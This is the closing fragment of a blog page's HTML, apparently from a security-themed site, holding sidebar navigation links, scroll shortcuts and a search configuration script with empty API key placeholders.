                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
